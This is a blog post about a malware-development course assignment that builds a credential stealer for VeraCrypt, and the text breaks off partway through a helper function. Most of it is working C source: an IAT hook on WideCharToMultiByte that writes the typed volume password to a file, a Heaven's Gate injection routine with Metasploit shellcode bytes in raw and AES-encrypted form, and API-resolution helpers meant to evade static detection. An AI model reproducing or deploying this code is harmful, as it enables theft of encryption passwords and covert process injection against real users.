---
title: "VeraCrypt Stealer"
tags: ["malware-development", "windows", "shellcode"]
---

## Introduction

This blog post is about the assignment part of the course: Malware Development Intermediate, by <a href="https://twitter.com/sektor7net" target="_blank">sektor7</a>. The course can be found here: <a href="https://institute.sektor7.net/rto-maldev-intermediate" target="_blank">MalDev Intermediate</a>. The purpose of this assignment is to steal the password (without using a keylogger), which a user types to mount an encrypted disk (volume), created with <a href="https://github.com/veracrypt/VeraCrypt" target="_blank">VeraCrypt</a> software. To achieve it, the assignment consists of 3 parts:
1. [**VCsniff**](#vcsniff): The tool <a href="https://www.rohitab.com/downloads" target="_blank">API Monitor v2 64-bit</a> was used to find the exact API call that deals with the password provided by the user. So, the API `WideCharToMultiByte` is being hooked using the **IAT Hooking** technique and the captured password is stored, in my case, at `C:\VeraCrypt\data.txt`.
2. [**VCmigrate**](#vcmigrate): VCmigrate is responsible for migrating from `C:\Windows\SysWOW64\notepad.exe` (32-bit process) to `VeraCrypt.exe` (64-bit process). This happens to get familiar with **WoW64** and **Heaven's Gate**.
3. [**VCload**](#vcload): We perform Process Injection into `notepad.exe` by using the **Thread Context Injection** technique. At this point the DLL from the previous steps (we will see later) is loaded reflectively as shellcode (sRDI) and we wait for the opening of `VeraCrypt.exe` and the typing of the password.

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> **Persistence**
>
> A small change between the assignment and the implementation is the persistence part. During the course, the 32-bit process `OneDrive.exe` is spawn at startup, but in more recent Windows versions `OneDrive.exe` process is 64-bit. So, in order to still demonstrate Heaven’s Gate, I decided to skip the persistence part, where I could just place the `VCload` executable into the folder:
>
> `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
>
> That's why I decided to target the 32-bit process `notepad.exe`, from which we migrate to the 64-bit process `VeraCrypt.exe`.
{: .prompt-info }
<!-- markdownlint-restore -->

My code, based on the course's template code, can be found in my Github: <a href="https://github.com/geobour98/veracrypt-stealer" target="_blank">geobour98's Github</a>.

## VCsniff {#vcsniff}

In order to find the API call that handles the user's password, we will use the API Monitor tool, as said previously.

We filter the APIs to **Windows Application UI Development** and click **Start Monitoring** for the `VeraCrypt.exe` in API Monitor. 

In **VeraCrypt**, select the encrypted file, which in my case is `C:\VeraCrypt\mydata`, select the Drive letter to mount to (in my case `Y`), click **Mount** and put the password (in my case `P@$$w0rd!`).

Then, **Stop Monitoring** the process `VeraCrypt.exe` and **Find** the API, where this password was used.

Below we can see the <a href="https://learn.microsoft.com/en-us/windows/win32/api/stringapiset/nf-stringapiset-widechartomultibyte" target="_blank">WideCharToMultiByte</a> Win32 API and the password in the arguments `lpWideCharStr` and `lpMultiByteStr`.

![Desktop View](/assets/img/veracrypt-stealer/api-monitor.png){: width="972" height="589" }
_Finding WideCharToMultiByte with API Monitor_

Now, we know that we have to hook this API in order to steal the password, using **IAT Hooking**.

First of all, the file `vcsniff-iat.cpp` will be compiled as a **DLL**, that's why we export the `DllMain` function. Then, the function `Hookem` is executed, where we provide the API `WideCharToMultiByte` that is found in `kernel32.dll`. 

The purpose of this function is to set a hook on the original `WideCharToMultiByte` function by changing the address of the imported function in the IAT. We find all the imports in `kernel32.dll` and then search for `WideCharToMultiByte` in IAT. We compare in a loop the address of the API that we want to hook (`WideCharToMultiByte`) with the address of the original function. The latter is calculated with `GetProcAddress` and `GetModuleHandle`. When the addresses match, we change the address of `WideCharToMultiByte` to the function that will perform the actual hooking (`HookedWideCharToMultiByte`). 

In short, when we find `WideCharToMultiByte` in the IAT, we change its address, pointing to `HookedWideCharToMultiByte`. This can be seen in the code below:

```c
// Set hook on origFunc()
BOOL Hookem(char * dll, char * origFunc, PROC hookingFunc) {

    ULONG size;
	DWORD i;
	BOOL found = FALSE;

	// get a HANDLE to a main module == BaseImage
	HANDLE baseAddress = GetModuleHandle(NULL);			
	
	// get Import Table of main module
	PIMAGE_IMPORT_DESCRIPTOR importTbl = (PIMAGE_IMPORT_DESCRIPTOR) ImageDirectoryEntryToDataEx(
												baseAddress,
												TRUE,
												IMAGE_DIRECTORY_ENTRY_IMPORT,
												&size,
												NULL);

	// find imports for target dll 
	for (i = 0; i < size ; i++){
		char * importName = (char *)((PBYTE) baseAddress + importTbl[i].Name);
		if (_stricmp(importName, dll) == 0) {
				found = TRUE;
				break;
		}
	}
	if (!found)
		return FALSE;

	// Optimization: get original address of function to hook 
	// and use it as a reference when searching through IAT directly
	PROC origFuncAddr = (PROC) GetProcAddress(GetModuleHandle(dll), origFunc);

	// Search IAT
	PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA) ((PBYTE) baseAddress + importTbl[i].FirstThunk);
	while (thunk->u1.Function) {
		PROC * currentFuncAddr = (PROC *) &thunk->u1.Function;
		
		// found
		if (*currentFuncAddr == origFuncAddr) {

			// make sure memory is writable
			DWORD oldProtect = 0;
			VirtualProtect((LPVOID) currentFuncAddr, 4096, PAGE_READWRITE, &oldProtect);

			// set the hook
			*currentFuncAddr = (PROC)hookingFunc;

			// revert protection setting back
			VirtualProtect((LPVOID) currentFuncAddr, 4096, oldProtect, &oldProtect);

			//OutputDebugStringA("IAT function hooked!\n");
			return TRUE;
		}
	thunk++;
	}
	
	return FALSE;
}
``` 

After that, we are at the point where `VeraCrypt.exe` thinks that it executes the original `WideCharToMultiByte`, but instead it executes our own hooking function. The difference in our function `HookedWideCharToMultiByte` is that we store the data of the 5<sup>th</sup> parameter `lpMultiByteStr` in a buffer and then save that buffer into the file `C:\VeraCrypt\data.txt`. The contents of the file should be the captured password if everything worked fine! Then, the original function `WideCharToMultiByte` is executed through a pointer. The code of this function can be seen below:

```c
// Hooking function
int HookedWideCharToMultiByte(UINT CodePage, DWORD dwFlags, _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar) {
	
	int ret;
	char buffer[50];
	HANDLE hFile = NULL;
	DWORD numBytes;
	
	// call original function
	ret = pWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);
	
	sprintf(buffer, "DATA = %s\n", lpMultiByteStr);
	//OutputDebugStringA(buffer);
	
	// store captured data in a file
	hFile = CreateFile("C:\\VeraCrypt\\data.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		OutputDebugStringA("Error with log file!\n");
	else
		WriteFile(hFile, buffer, strlen(buffer), &numBytes, NULL);

	CloseHandle(hFile);
	
	return ret;
}
```

Now, we can run the compile script (`compile.bat`) and get the DLL `vcsniff-iat.dll`:

```shell
C:\Projects\sektor7\intermediate\08.Project\VCsniff>compile.bat
vcsniff-iat.cpp
   Creating library vcsniff-iat.lib and object vcsniff-iat.exp

C:\Projects\sektor7\intermediate\08.Project\VCsniff>
```

Now, simply copy the DLL into **VCmigrate** folder.

## VCmigrate {#vcmigrate}

As discussed previously, VCmigrate's purpose is to migrate from 32-bit `notepad.exe` to 64-bit `VeraCrypt.exe`.

First of all, the reason that we created a DLL in VCsniff is to perform Shellcode Reflective DLL Injection (**sRDI**). The original idea of Reflective DLL Injection comes from the great <a href="https://twitter.com/stephenfewer" target="_blank">Stephen Fewer</a> and his repository <a href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank">ReflectiveDLLInjection</a>. Basically, with this technique we can perform DLL Injection from memory rather than from disk. This technique works fine when we have the source code of the DLL to be injected, but doesn't work otherwise. That's when <a href="https://twitter.com/monoxgas" target="_blank">monoxgas</a> came up with the idea of Shellcode Reflective DLL Injection in the repository <a href="https://github.com/monoxgas/sRDI" target="_blank">sRDI</a>. The improvement is that we can convert the DLL to shellcode and still load it reflectively in memory, without the need of the source code of the DLL. A deeper dive into this great technique can be found at <a href="https://www.netspi.com/blog/technical/adversary-simulation/srdi-shellcode-reflective-dll-injection/" target="_blank">sRDI - Shellcode Reflective DLL Injection</a>.

To convert the DLL to shellcode we must have the sRDI repo locally. We use the `ConvertToShellcode.py` Python script with the exported function name of the `vcsniff-iat.dll`, which is `DllMain`. This process is shown below:

```shell
C:\Projects\sektor7\intermediate\08.Project\VCmigrate>C:\Python311\python.exe ..\sRDI\Python\ConvertToShellcode.py -f DllMain vcsniff-iat.dll
Creating Shellcode: vcsniff-iat.bin

C:\Projects\sektor7\intermediate\08.Project\VCmigrate>
```

Now, the shellcode `vcsniff-iat.bin` has been generated. We can also encrypt this binary with AES and output the result into `out.txt`.

```shell
C:\Projects\sektor7\intermediate\08.Project\VCmigrate>C:\Python311\python.exe aes.py vcsniff-iat.bin > out.txt

C:\Projects\sektor7\intermediate\08.Project\VCmigrate>
``` 

The file `aes.py` comes from the course template code.

Now we copy the whole file `out.txt` and paste into `vcmigrate.cpp` at the top without any modifications.

This file will be loaded again with Shellcode Reflective DLL Injection from **VCload**, that's why we have `DllMain` and we export the function `Go`. The `Go` function looks for the process `VeraCrypt.exe` every 5 seconds. This means that we wait until this process is spawned. When the process is spawned we try to open a handle on it, and if it is successful we perform the injection with the function `InjectWOW64`. 

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> **WOW64 and Heaven's Gate**
>
> **WOW64**: According to <a href="https://learn.microsoft.com/en-us/windows/win32/winprog64/running-32-bit-applications" target="_blank">Running 32-bit Applications, by Microsoft</a>: "WOW64 is the x86 emulator that allows 32-bit Windows-based applications to run seamlessly on 64-bit Windows". Several steps are included in this process like: **Separate Directories**, **WOW64 Emulation** and **File System and Registry Redirection**, which we won’t exlore further.
>
> **Heaven's Gate**: According to <a href="https://www.alex-ionescu.com/closing-heavens-gate/" target="_blank">Closing “Heaven’s Gate”, by Alex Ionescu</a>: "Heaven's Gate, then, refers to subverting the fact that a 64-bit NTDLL exists (and a 64-bit heap, PEB and TEB), and manually jumping into the long-mode code segment without having to issue a system call and being subjected to the code flow that WoW64 will attempt to enforce. In other words, it gives one the ability to create "naked" 64-bit code, which will be able to run covertly, including issuing system calls, without the majority of products able to intercept and/or introspect its execution". In short, the transition between 32-bit and 64-bit address space is done via Heaven's Gate. The implementaion of Heaven's Gate can be found in this great article <a href="https://www.malwaretech.com/2014/02/the-0x33-segment-selector-heavens-gate.html" target="_blank">The 0x33 Segment Selector (Heavens Gate), by Marcus Hutchins</a>.
{: .prompt-info }
<!-- markdownlint-restore -->

Now we will get back to `InjectWOW64` function implementation in order to perform the migration from 32-bit to 64-bit process. 3 functions from the Metasploit Framework are used to execute native x64 code from a wow64 (x86) process and to create a remote thread via RtlCreateUserThread. The first 2 are at the file <a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm" target="_blank">executex64.asm</a> and the last at <a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/migrate/remotethread.asm" target="_blank">remotethread.asm</a> respectively. The function `sh_executex64` from **executex64.asm** performs the switch to 64-bit mode and runs the function `sh_wownativex` from **executex64.asm**, which calls the `RtlCreateUserThread` API from **remotethread.asm** in the target process. 

The 2 functions `sh_executex64` and `sh_wownativex` are in shellcode form and are AES-encrypted at the beginning. Then we have a classic process injection into `VeraCrypt.exe` with `VirtualAllocEx` and `WriteProcessMemory`, by first decrypting the `payload`, which is the sRDI from VCsniff that is responsible for the actual stealing (sniffing) of the password.

After that, 2 buffers are allocated for the functions `sh_executex64` and `wownativex`, where the decrypted payloads will be stored. After they are decrypted, they are copied over the wow64->x64 stub and the native x64 function, which are the addresses of the allocated region of pages `pExecuteX64` and `pX64function` respectively.

Then, the WOW64 context is set up, which is a structure for injection via `migrate_via_remotethread_wow64`. The members are the following: **a handle to the process where the thread should be created**, **the address of the function to execute on the new thread (the stealing (sniffing) shellcode from VeraCrypt injection)**, **a user-provided argument to pass to the thread start routine** and **an optional pointer to a variable that receives a handle to the new thread**. Since the function `RtlCreateUserThread` is undocumented, we can find more information at <a href="https://ntdoc.m417z.com/rtlcreateuserthread" target="_blank">Native API online documentation, by m417z</a> about the previous members.

Finally, a new thread is created in `VeraCrypt.exe`. If it is successful, we resume the thread, execute the payload and release the region of pages by `pExecuteX64` and `pX64function`. The code of `InjectWOW64` is shown below:

```c
int InjectWOW64(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
//	src: https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.c

	LPVOID pRemoteCode = NULL;
	EXECUTEX64 pExecuteX64   = NULL;
	X64FUNCTION pX64function = NULL;
	WOW64CONTEXT * ctx       = NULL;

/*
 A simple function to execute native x64 code from a wow64 (x86) process. 

 Can be called from C using the following prototype:
     typedef DWORD (WINAPI * EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );
 The native x64 function you specify must be in the following form (as well as being x64 code):
     typedef BOOL (WINAPI * X64FUNCTION)( DWORD dwParameter );

 Original binary:
     src: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm
	BYTE sh_executex64[] =  "\x55\x89\xE5\x56\x57\x8B\x75\x08\x8B\x4D\x0C\xE8\x00\x00\x00\x00"
							"\x58\x83\xC0\x25\x83\xEC\x08\x89\xE2\xC7\x42\x04\x33\x00\x00\x00"
							"\x89\x02\xE8\x09\x00\x00\x00\x83\xC4\x14\x5F\x5E\x5D\xC2\x08\x00"
							"\x8B\x3C\x24\xFF\x2A\x48\x31\xC0\x57\xFF\xD6\x5F\x50\xC7\x44\x24"
							"\x04\x23\x00\x00\x00\x89\x3C\x24\xFF\x2C\x24";

	src: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/migrate/remotethread.asm
	BYTE sh_wownativex[] = "\xFC\x48\x89\xCE\x48\x89\xE7\x48\x83\xE4\xF0\xE8\xC8\x00\x00\x00"
							"\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48"
							"\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A"
							"\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9"
							"\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C"
							"\x48\x01\xD0\x66\x81\x78\x18\x0B\x02\x75\x72\x8B\x80\x88\x00\x00"
							"\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40"
							"\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6"
							"\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0"
							"\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40"
							"\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0"
							"\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58"
							"\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A"
							"\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF\x5D\x4D\x31\xC9\x41\x51\x48\x8D"
							"\x46\x18\x50\xFF\x76\x10\xFF\x76\x08\x41\x51\x41\x51\x49\xB8\x01"
							"\x00\x00\x00\x00\x00\x00\x00\x48\x31\xD2\x48\x8B\x0E\x41\xBA\xC8"
							"\x38\xA4\x40\xFF\xD5\x48\x85\xC0\x74\x0C\x48\xB8\x00\x00\x00\x00"
							"\x00\x00\x00\x00\xEB\x0A\x48\xB8\x01\x00\x00\x00\x00\x00\x00\x00"
							"\x48\x83\xC4\x50\x48\x89\xFC\xC3";
*/

	// AES-encrypted sh_executex64 function (switches to 64-bit mode and runs sh_wownativex)
	unsigned char sh_executex64[] = { 0xf7, 0x69, 0x26, 0xaf, 0x10, 0x56, 0x2a, 0xcc, 0xeb, 0x96, 0x6b, 0xd0, 0xb8, 0xe3, 0x4d, 0x44, 0x16, 0xb0, 0xf8, 0x9d, 0x32, 0xd9, 0x65, 0x12, 0xa2, 0x9e, 0xec, 0x5d, 0x37, 0xde, 0x34, 0x9a, 0x94, 0x19, 0xc7, 0xa5, 0xe6, 0xe8, 0x3e, 0xa2, 0x1d, 0x5a, 0x77, 0x25, 0xcb, 0xc, 0xcd, 0xd0, 0x59, 0x11, 0x3c, 0x2d, 0x4d, 0x16, 0xf1, 0x95, 0x3a, 0x33, 0x0, 0xb4, 0x3, 0x55, 0x98, 0x6f, 0x61, 0x84, 0x61, 0x2b, 0x8a, 0xe8, 0x53, 0x47, 0xaa, 0x58, 0xfc, 0x70, 0x91, 0xcd, 0xa9, 0xb1 };
	unsigned int sh_executex64_len = sizeof(sh_executex64);
	unsigned char sh_executex64_key[] = { 0x26, 0x96, 0xcc, 0x43, 0xca, 0x1f, 0xf8, 0xa, 0xe5, 0xcc, 0xbf, 0xf1, 0x2f, 0xc9, 0xae, 0x71 };
	size_t sh_executex64_key_len = sizeof(sh_executex64_key);

	// AES-encrypted sh_wownativex function (calling RtlCreateUserThread in target process)
	unsigned char sh_wownativex[] = { 0x20, 0x8f, 0x32, 0x33, 0x59, 0xa1, 0xce, 0x2f, 0xf8, 0x8b, 0xa, 0xb4, 0x2a, 0x7f, 0xe6, 0x26, 0xe4, 0xd1, 0x4e, 0x25, 0x38, 0x57, 0xdd, 0xc4, 0x2c, 0x1c, 0x10, 0x2b, 0x70, 0x0, 0x9, 0x67, 0x5c, 0x70, 0x6d, 0x67, 0x4f, 0x27, 0xe8, 0xaf, 0xa1, 0x6f, 0x10, 0x42, 0x73, 0x9d, 0x4a, 0xb1, 0x6, 0x22, 0x89, 0xef, 0xac, 0x40, 0xd7, 0x93, 0x94, 0x6e, 0x4c, 0x6e, 0xf4, 0xcb, 0x46, 0x4d, 0xf3, 0xe8, 0xb5, 0x36, 0x11, 0xa6, 0xad, 0xeb, 0x8d, 0xda, 0xa0, 0x54, 0x75, 0xd9, 0xf3, 0x41, 0x34, 0xb3, 0xa6, 0x70, 0x41, 0x3e, 0xf3, 0x96, 0x97, 0x12, 0x74, 0x6b, 0x2e, 0x36, 0x31, 0x26, 0x86, 0x2, 0x24, 0x59, 0x40, 0xb9, 0xbb, 0x2b, 0xa2, 0x98, 0xbe, 0x15, 0x73, 0xb5, 0x90, 0x39, 0xe5, 0x82, 0xbb, 0xdd, 0x7, 0xe9, 0x9d, 0x89, 0x9a, 0x9e, 0x5f, 0x94, 0xde, 0x2, 0x80, 0x36, 0x45, 0x5d, 0x8e, 0xe6, 0x5e, 0x2c, 0x58, 0x59, 0xf4, 0xf7, 0xa0, 0xbf, 0x7e, 0x94, 0xff, 0x50, 0xf0, 0x76, 0x74, 0x2f, 0xd1, 0x91, 0x18, 0x65, 0x12, 0x30, 0xfa, 0x4, 0x61, 0xa5, 0x4d, 0x25, 0x57, 0xf4, 0x52, 0x99, 0xa2, 0x93, 0x67, 0xe1, 0x6, 0x43, 0x4b, 0x55, 0x53, 0x67, 0x89, 0x18, 0x71, 0x72, 0xdb, 0x82, 0xef, 0x5b, 0xdc, 0x8b, 0xb0, 0x91, 0xf5, 0x58, 0xe4, 0x85, 0xc3, 0x80, 0x7b, 0x79, 0x21, 0x3a, 0x60, 0x99, 0xc5, 0x62, 0x2c, 0x73, 0xa4, 0x2b, 0xe2, 0xc, 0xda, 0xa2, 0x88, 0x6b, 0x2f, 0x38, 0x80, 0xfd, 0xb1, 0xaf, 0xea, 0x4f, 0xb5, 0x0, 0xda, 0x46, 0x46, 0x9d, 0x23, 0xdd, 0xe3, 0x4a, 0xf5, 0xc9, 0x8, 0xf0, 0x97, 0xa9, 0x55, 0x71, 0xda, 0x84, 0xa9, 0xf5, 0xcb, 0x1f, 0xb9, 0xb9, 0x67, 0xf7, 0xf2, 0x2f, 0x2a, 0x56, 0x3, 0xe1, 0x56, 0x26, 0xb4, 0x3a, 0xd9, 0xe2, 0x11, 0x8a, 0x8f, 0xef, 0x8c, 0x89, 0xc0, 0x26, 0x9c, 0x9f, 0xe5, 0x18, 0xd4, 0xd7, 0xae, 0x91, 0xbf, 0x2b, 0x14, 0xbb, 0xfd, 0xe0, 0xb5, 0x9c, 0x9d, 0x81, 0x71, 0x5d, 0xdd, 0xe6, 0x5d, 0x8a, 0xe6, 0x61, 0xf2, 0x69, 0xf8, 0x95, 0x4f, 0xcd, 0xe3, 0x52, 0x1f, 0x14, 0xe5, 0x8c };
	unsigned int sh_wownativex_len = sizeof(sh_wownativex);
	unsigned char sh_wownativex_key[] = { 0xe5, 0x53, 0xc4, 0x11, 0x75, 0x14, 0x86, 0x8f, 0x59, 0x35, 0x7c, 0xc7, 0x8b, 0xc5, 0xdc, 0x2d };
	size_t sh_wownativex_key_len = sizeof(sh_wownativex_key);

	// inject payload into target process (VeraCrypt)
	AESDecrypt((char *) payload, payload_len, (char *) key, key_len);
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	
	// alloc a RW buffer in this process for the EXECUTEX64 function
	pExecuteX64 = (EXECUTEX64)VirtualAlloc( NULL, sizeof(sh_executex64), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );
	// alloc a RW buffer in this process for the X64FUNCTION function (and its context)
	pX64function = (X64FUNCTION)VirtualAlloc( NULL, sizeof(sh_wownativex)+sizeof(WOW64CONTEXT), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );

	// decrypt and copy over the wow64->x64 stub
	AESDecrypt((char *) sh_executex64, sh_executex64_len, (char *) sh_executex64_key, sh_executex64_key_len);
	memcpy( pExecuteX64, sh_executex64, sh_executex64_len );
	VirtualAlloc( pExecuteX64, sizeof(sh_executex64), MEM_COMMIT, PAGE_EXECUTE_READ );

	// decrypt and copy over the native x64 function
	AESDecrypt((char *) sh_wownativex, sh_wownativex_len, (char *) sh_wownativex_key, sh_wownativex_key_len);
	memcpy( pX64function, sh_wownativex, sh_wownativex_len );

	// pX64function shellcode modifies itself during the runtime, so memory has to be RWX
	VirtualAlloc( pX64function, sizeof(sh_wownativex)+sizeof(WOW64CONTEXT), MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	// set the context
	ctx = (WOW64CONTEXT *)( (BYTE *)pX64function + sh_wownativex_len );

	ctx->h.hProcess       = hProc;
	ctx->s.lpStartAddress = pRemoteCode;
	ctx->p.lpParameter    = 0;
	ctx->t.hThread        = NULL;
	
	// run a new thread in target process
	pExecuteX64( pX64function, (DWORD)ctx );
	
	if( ctx->t.hThread ) {
		// if success, resume the thread -> execute payload
		ResumeThread(ctx->t.hThread);

		// cleanup in target process
		VirtualFree(pExecuteX64, 0, MEM_RELEASE);
		VirtualFree(pX64function, 0, MEM_RELEASE);

		return 0;
	}
	else
		return 1;
}
```

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> **x86 Native Tools Command Prompt Compilation**
>
> We must run the compile script (`compile.bat`) from **x86 Native Tools cmd** to get 32-bit shellcode for **VCload**, since we want to inject to the 32-bit `notepad.exe` process.
{: .prompt-info }
<!-- markdownlint-restore -->

Compile (with `compile.bat`) and get the DLL `vcmigrate.dll` with the function `Go` exported:

```shell
C:\Projects\sektor7\intermediate\08.Project\VCmigrate>compile.bat
vcmigrate.cpp
   Creating library vcmigrate.lib and object vcmigrate.exp

C:\Projects\sektor7\intermediate\08.Project\VCmigrate>
```

Now, simply copy the DLL into **VCload** folder.

## VCload {#vcload}

The purpose of **VCload** is to inject into 32-bit `notepad.exe` and execute the `vcmigrate.dll` reflectively as shellcode (**sRDI**).

In `vcload.cpp` we start by AES-decrypting some strings like the process name: `notepad.exe`.

After that, the custom implementations of `GetProcAddress` and `GetModuleHandle` from the course are used in order to minimize the imports and hide this common malware combination from static detection. These are `hlpGetProcAddress` and `hlpGetModuleHandle` and are located at `helpers.cpp`. `hlpGetProcAddress`'s purpose is to retrieve the address of an exported function, and the first example in the code is to retrieve the address of `OpenProcess` from `kernel32.dll`. The `hlpGetModuleHandle` is used to retrieve a specific module handle, and in the first example this is the `kernel32.dll` module.

#### hlpGetModuleHandle

The implementation of `hlpGetModuleHandle` is very close to <a href="https://www.ired.team/offensive-security/code-injection-process-injection/finding-kernel32-base-and-function-addresses-in-shellcode" target="_blank">Finding Kernel32 Base and Function Addresses in Shellcode, by spotheplanet</a>. Basically, the base address of the module `kernel32.dll` is always resolved 3<sup>rd</sup> after the current module, which in my case is `notepad.exe`, and `ntdll.dll`. So, the process looks like this:

```text
TEB->PEB->Ldr->InMemoryOrderModuleList->notepad.exe->ntdll->kernel32.BaseDll
```

First, we get the offset to the Process Environment Block (**PEB**) on either 32-bit or 64-bit. Having the offset to **PEB**, we can get to **Ldr**, which contains the pointer to **InMemoryOrderModuleList** that contains information about the modules that were loaded in the process (**notepad.exe**, **ntdll.dll** and **kernel32.dll**). When the module is found, its base address is returned.

The function `hlpGetModuleHandle` is shown below:

```c
HMODULE WINAPI hlpGetModuleHandle(LPCWSTR sModuleName) {

	// get the offset of Process Environment Block
#ifdef _M_IX86 
	PEB * ProcEnvBlk = (PEB *) __readfsdword(0x30);
#else
	PEB * ProcEnvBlk = (PEB *)__readgsqword(0x60);
#endif

	// return base address of a calling module
	if (sModuleName == NULL) 
		return (HMODULE) (ProcEnvBlk->ImageBaseAddress);

	PEB_LDR_DATA * Ldr = ProcEnvBlk->Ldr;
	LIST_ENTRY * ModuleList = NULL;
	
	ModuleList = &Ldr->InMemoryOrderModuleList;
	LIST_ENTRY *  pStartListEntry = ModuleList->Flink;

	for (LIST_ENTRY *  pListEntry  = pStartListEntry;  		// start from beginning of InMemoryOrderModuleList
					   pListEntry != ModuleList;	    	// walk all list entries
					   pListEntry  = pListEntry->Flink)	{
		
		// get current Data Table Entry
		LDR_DATA_TABLE_ENTRY * pEntry = (LDR_DATA_TABLE_ENTRY *) ((BYTE *) pListEntry - sizeof(LIST_ENTRY));

		// check if module is found and return its base address
		if (lstrcmpiW(pEntry->BaseDllName.Buffer, sModuleName) == 0)
			return (HMODULE) pEntry->DllBase;
	}

	// otherwise:
	return NULL;

}
```

#### hlpGetProcAddress

First, we get the pointers of **DOS** and **NT** headers. Then, we locate the **Optional Header**, the **Data Directory** and the **Export Directory**. Then, we get some pointers to the Export Directory structure and specifically to `AddressOfFunctions`, `AddressOfNames` and `AddressOfNameOrdinals`. After that, we are trying to resolve the wanted function either by `ordinal` (number) or by `name`. Finally, we check whether the function is forwarded or not. An easy way to check for forwarded functions is to open a PE in PE-bear, go to **Imports** section and look for **Forwarders** in the modules there. If we find a forwarded function, we have to retrieve the address of the new module (library) with the functions `hlpGetProcAddress` and `hlpGetModuleHandle` again and locate the function.

The function `hlpGetProcAddress` is shown below:

```c
FARPROC WINAPI hlpGetProcAddress(HMODULE hMod, char * sProcName) {

	char * pBaseAddr = (char *) hMod;

	// get pointers to main headers/structures
	IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) pBaseAddr;
	IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (pBaseAddr + pDosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
	IMAGE_DATA_DIRECTORY * pExportDataDir = (IMAGE_DATA_DIRECTORY *) (&pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
	IMAGE_EXPORT_DIRECTORY * pExportDirAddr = (IMAGE_EXPORT_DIRECTORY *) (pBaseAddr + pExportDataDir->VirtualAddress);

	// resolve addresses to Export Address Table, table of function names and "table of ordinals"
	DWORD * pEAT = (DWORD *) (pBaseAddr + pExportDirAddr->AddressOfFunctions);
	DWORD * pFuncNameTbl = (DWORD *) (pBaseAddr + pExportDirAddr->AddressOfNames);
	WORD * pHintsTbl = (WORD *) (pBaseAddr + pExportDirAddr->AddressOfNameOrdinals);

	// function address we're looking for
	void *pProcAddr = NULL;

	// resolve function by ordinal
	if (((DWORD_PTR)sProcName >> 16) == 0) {
		WORD ordinal = (WORD) sProcName & 0xFFFF;	// convert to WORD
		DWORD Base = pExportDirAddr->Base;			// first ordinal number

		// check if ordinal is not out of scope
		if (ordinal < Base || ordinal >= Base + pExportDirAddr->NumberOfFunctions)
			return NULL;

		// get the function virtual address = RVA + BaseAddr
		pProcAddr = (FARPROC) (pBaseAddr + (DWORD_PTR) pEAT[ordinal - Base]);
	}
	// resolve function by name
	else {
		// parse through table of function names
		for (DWORD i = 0; i < pExportDirAddr->NumberOfNames; i++) {
			char * sTmpFuncName = (char *) pBaseAddr + (DWORD_PTR) pFuncNameTbl[i];
	
			if (strcmp(sProcName, sTmpFuncName) == 0)	{
				// found, get the function virtual address = RVA + BaseAddr
				pProcAddr = (FARPROC) (pBaseAddr + (DWORD_PTR) pEAT[pHintsTbl[i]]);
				break;
			}
		}
	}

	// check if found VA is forwarded to external library.function
	if ((char *) pProcAddr >= (char *) pExportDirAddr && 
		(char *) pProcAddr < (char *) (pExportDirAddr + pExportDataDir->Size)) {
		
		char * sFwdDLL = _strdup((char *) pProcAddr); 	// get a copy of library.function string
		if (!sFwdDLL) return NULL;

		// get external function name
		char * sFwdFunction = strchr(sFwdDLL, '.');
		*sFwdFunction = 0;					// set trailing null byte for external library name -> library\x0function
		sFwdFunction++;						// shift a pointer to the beginning of function name

